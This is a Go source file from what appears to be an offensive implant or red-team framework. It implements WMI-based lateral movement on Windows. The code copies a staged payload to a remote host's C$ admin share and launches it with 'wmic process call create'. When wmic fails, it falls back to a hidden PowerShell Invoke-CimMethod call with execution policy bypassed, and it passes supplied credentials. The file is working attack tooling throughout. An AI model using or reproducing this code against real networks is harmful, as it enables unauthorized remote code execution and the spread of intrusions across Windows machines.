//go:build jump_wmi && windows

package core

import (
	"context"
	"fmt"
	"os"
	"strings"
)

func jumpWMI(ctx context.Context, s *jumpSpec, name string) (string, error) {
	unc := fmt.Sprintf(`\\%s\C$\Windows\Temp\%s`, s.Target, name)
	if err := writeStage(s, unc); err != nil {
		return "", fmt.Errorf("copy to C$: %w", err)
	}
	remote := fmt.Sprintf(`cmd.exe /c C:\Windows\Temp\%s`, name)

	out, err := wmiViaWmic(ctx, s, remote)
	used := "wmic"
	if err != nil {
		// wmic is deprecated and absent on recent Server images.
		out, err = wmiViaCIM(ctx, s, remote)
		used = "cim"
	}
	if !s.NoCleanup {
		_ = os.Remove(unc)
	}
	if err != nil {
		return "", fmt.Errorf("wmi/%s: %v (%s)", used, err, out)
	}
	return "wmi/" + used + ": " + s.Target + "\n" + out, nil
}

func wmiViaWmic(ctx context.Context, s *jumpSpec, remote string) (string, error) {
	args := []string{"/node:" + s.Target}
	if s.User != "" {
		args = append(args, "/user:"+s.User, "/password:"+s.Pass)
	}
	args = append(args, "process", "call", "create", remote)
	return runHidden(ctx, "wmic", args...)
}

// wmiViaCIM creates the process through CIM over DCOM. It runs as
// the current token; an explicit --user is honoured by wmic first.
func wmiViaCIM(ctx context.Context, s *jumpSpec, remote string) (string, error) {
	ps := fmt.Sprintf(
		`$o=Invoke-CimMethod -ClassName Win32_Process `+
			`-ComputerName %q -MethodName Create `+
			`-Arguments @{CommandLine=%q}; `+
			`Write-Output ("pid=" + $o.ProcessId)`,
		s.Target, remote)
	return runHidden(ctx, "powershell", "-NoProfile",
		"-NonInteractive", "-ExecutionPolicy", "Bypass",
		"-Command", strings.TrimSpace(ps))
}
